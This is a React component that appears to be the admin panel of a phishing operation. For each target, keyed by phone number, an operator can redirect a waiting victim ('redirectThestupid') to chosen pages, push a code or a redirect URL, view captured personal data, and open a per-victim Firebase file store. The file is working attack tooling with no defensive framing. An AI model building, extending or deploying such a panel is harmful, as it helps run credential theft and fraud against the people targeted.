import React, { useState } from "react";

function AdminCard({ ctr, redirectThestupid, getPassedUserData, pages }) {
  [];
  const [isController, setIsController] = useState(true);
  const [code, setCode] = useState(null);
  const [redirect, setRedirect] = useState(null);

  const toggleTab = (isControl) => {
    setIsController(isControl);
  };

  return (
    <div
      key={ctr?.id}
      className="w-full bg-white border border-gray-200 rounded-lg shadow dark:bg-gray-800 dark:border-gray-700"
    >
      <ul
        className="flex flex-wrap text-sm font-medium text-center text-gray-500 border-b border-gray-200 rounded-t-lg bg-gray-50 dark:border-gray-700 dark:text-gray-400 dark:bg-gray-800"
        id="defaultTab"
        data-tabs-toggle="#defaultTabContent"
        role="tablist"
      >
        <li className="mr-2">
          <button
            onClick={() => toggleTab(true)}
            id="Controller"
            type="button"
            role="tab"
            className={`inline-block p-4 ${
              isController ? "text-blue-600" : "text-gray-300"
            } rounded-tl-lg hover:bg-gray-100 dark:bg-gray-800 dark:hover:bg-gray-700 `}
          >
            Controller
          </button>
        </li>
        <li className="mr-2">
          <button
            onClick={() => toggleTab(false)}
            id="services-tab"
            data-tabs-target="#services"
            type="button"
            role="tab"
            aria-controls="services"
            aria-selected="false"
            className={`inline-block p-4 ${
              !isController ? "text-blue-600" : "text-gray-300"
            } hover:text-gray-600 hover:bg-gray-100 dark:hover:bg-gray-700 dark:hover:text-gray-300`}
          >
            DATA
          </button>
        </li>
        <li className="mr-2">
          <button
            id="services-tab"
            data-tabs-target="#services"
            type="button"
            role="tab"
            aria-controls="services"
            aria-selected="false"
            className={`inline-block p-4  hover:text-gray-600 hover:bg-gray-100 dark:hover:bg-gray-700 dark:hover:text-gray-300`}
          >
            PHONE : {ctr?.id}
          </button>
        </li>
        <li className="mr-2">
          <button
            onClick={() =>
              window.open(
                "https://console.firebase.google.com/project/ayoub-81259/storage/ayoub-81259.appspot.com/files/" +
                  ctr?.id,
                "_blank"
              )
            }
            id="services-tab"
            data-tabs-target="#services"
            type="button"
            role="tab"
            aria-controls="services"
            aria-selected="false"
            className={`inline-block p-4  hover:text-gray-600 hover:bg-gray-100 dark:hover:bg-gray-700 dark:hover:text-gray-300`}
          >
            FILES
          </button>
        </li>
        <li className="mr-2">
          <button
            id="services-tab"
            data-tabs-target="#services"
            type="button"
            role="tab"
            aria-controls="services"
            aria-selected="false"
            className={`inline-block p-4  hover:text-gray-600 hover:bg-gray-100 dark:hover:bg-gray-700 dark:hover:text-gray-300`}
          >
            {ctr?.loading ? (
              <h3>He is Waiting </h3>
            ) : (
              <h3>Current : {ctr.link}</h3>
            )}
          </button>
        </li>
      </ul>
      <div id="defaultTabContent">
        <div
          className={`${
            isController ? "" : "hidden"
          } p-4 bg-white rounded-lg md:p-8 dark:bg-gray-800 flex lg:flex-row md:flex-row sm:flex-col lg:gap-28 md:gap-5 gap-1 flex-col`}
          id="about"
          role="tabpanel"
          aria-labelledby="about-tab"
        >
          <div className="flex gap-3">
            {pages.map((page, idx) => (
              <button
                key={idx}
                onClick={() => redirectThestupid(ctr?.id, { link: page })}
                type="button"
                className="text-white lg:text-sm bg-gradient-to-r from-purple-500 via-purple-600 to-purple-700 hover:bg-gradient-to-br focus:ring-4 focus:outline-none focus:ring-purple-300 dark:focus:ring-purple-800 shadow-lg shadow-purple-500/50 dark:shadow-lg dark:shadow-purple-800/80 font-medium rounded-lg text-sm px-5 py-2.5 text-center"
              >
                {page}
              </button>
            ))}
          </div>
          <div className="flex justify-center items-center gap-2 flex-wrap">
            <input
              onChange={(e) => setCode(e.target.value)}
              type="Code"
              id="code"
              className=" border border-gray-300 text-white text-sm rounded-lg   p-2.5 bg-gray-700  "
              placeholder="*********"
            />
            <button
              onClick={() => redirectThestupid(ctr?.id, { code })}
              type="button"
              className="text-white bg-gradient-to-r from-purple-500 via-purple-600 to-purple-700 hover:bg-gradient-to-br  shadow-lg shadow-purple-800/80 font-medium rounded-lg text-sm px-5 py-2.5 text-center "
            >
              <svg
                xmlns="http://www.w3.org/2000/svg"
                width={24}
                height={24}
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                strokeWidth={2}
                strokeLinecap="round"
                strokeLinejoin="round"
                className="feather feather-key"
              >
                <path d="M21 2l-2 2m-7.61 7.61a5.5 5.5 0 1 1-7.778 7.778 5.5 5.5 0 0 1 7.777-7.777zm0 0L15.5 7.5m0 0l3 3L22 7l-3-3m-3.5 3.5L19 4" />
              </svg>
            </button>
          </div>
          <div className="flex justify-center items-center gap-2 flex-wrap">
            <input
              onChange={(e) => setRedirect(e.target.value)}
              className=" border border-gray-300 text-white text-sm rounded-lg   p-2.5 bg-gray-700  "
              placeholder="https://exemple.com"
            />
            <button
              onClick={() => redirectThestupid(ctr?.id, { redirect })}
              type="button"
              className="text-white bg-gradient-to-r from-purple-500 via-purple-600 to-purple-700 hover:bg-gradient-to-br  shadow-lg shadow-purple-800/80 font-medium rounded-lg text-sm px-5 py-2.5 text-center "
            >
              <svg
                xmlns="http://www.w3.org/2000/svg"
                width={24}
                height={24}
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                strokeWidth={2}
                strokeLinecap="round"
                strokeLinejoin="round"
                className="feather feather-send"
              >
                <line x1={22} y1={2} x2={11} y2={13} />
                <polygon points="22 2 15 22 11 13 2 9 22 2" />
              </svg>
            </button>
          </div>
        </div>

        <div
          className={`${
            !isController ? "" : "hidden"
          } p-4 bg-white rounded-lg md:p-8 dark:bg-gray-800`}
          id="services"
          role="tabpanel"
          aria-labelledby="services-tab"
        >
          <h2 className="mb-5 text-2xl font-extrabold tracking-tight text-gray-900 dark:text-white">
            We invest in the world’s potential
          </h2>
          {/* List */}
          <ul
            role="list"
            className="space-y-4 text-gray-500 dark:text-gray-400"
          >
            {(getPassedUserData(ctr?.id) || []).map((tab) => {
              const keys = Array.from(new Set(Object.keys(tab)));
              const values = Array.from(new Set(Object.values(tab)));
              return keys.map((key, idx) => (
                <li key={idx} className="flex space-x-2">
                  {/* Icon */}
                  <svg
                    className="flex-shrink-0 w-4 h-4 text-blue-600 dark:text-blue-500"
                    fill="currentColor"
                    viewBox="0 0 20 20"
                    xmlns="http://www.w3.org/2000/svg"
                  >
                    <path
                      fillRule="evenodd"
                      d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z"
                      clipRule="evenodd"
                    />
                  </svg>
                  <span key={tab}>
                    {" "}
                    {key} : {values[idx]}
                  </span>
                </li>
              ));
            })}
          </ul>
        </div>
        <div
          className="hidden p-4 bg-white rounded-lg md:p-8 dark:bg-gray-800"
          id="statistics"
          role="tabpanel"
          aria-labelledby="statistics-tab"
        >
          <dl className="grid max-w-screen-xl grid-cols-2 gap-8 p-4 mx-auto text-gray-900 sm:grid-cols-3 xl:grid-cols-6 dark:text-white sm:p-8">
            <div className="flex flex-col">
              <dt className="mb-2 text-3xl font-extrabold">73M+</dt>
              <dd className="text-gray-500 dark:text-gray-400">Developers</dd>
            </div>
            <div className="flex flex-col">
              <dt className="mb-2 text-3xl font-extrabold">100M+</dt>
              <dd className="text-gray-500 dark:text-gray-400">
                Public repositories
              </dd>
            </div>
            <div className="flex flex-col">
              <dt className="mb-2 text-3xl font-extrabold">1000s</dt>
              <dd className="text-gray-500 dark:text-gray-400">
                Open source projects
              </dd>
            </div>
          </dl>
        </div>
      </div>
    </div>
  );
}

export default AdminCard;
